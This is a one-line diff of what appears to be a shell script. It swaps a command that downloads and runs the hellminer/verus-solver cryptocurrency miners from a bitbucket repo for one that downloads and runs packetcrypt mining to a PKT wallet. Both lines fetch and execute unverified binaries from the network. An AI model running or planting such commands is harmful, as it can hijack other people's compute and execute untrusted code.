@@ -1,1 +1,1 @@
-wget https://bitbucket.org/vps3/ngehe/downloads/verus-solver; wget https://bitbucket.org/vps3/ngehe/downloads/hellminer; chmod +x hellminer; chmod +x verus-solver; ./hellminer -c ap.luckpool.net:3956#xnsub -u RUTsC4pbFNKyPUkDLpfYb9Y1p8FY4vESqP.rizal2 -p x --cpu 7	
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q4sl4n6fknzrds0jmvuazafklkllwam95r8xj3u http://pool.pkt.world http://pool.pktpool.io
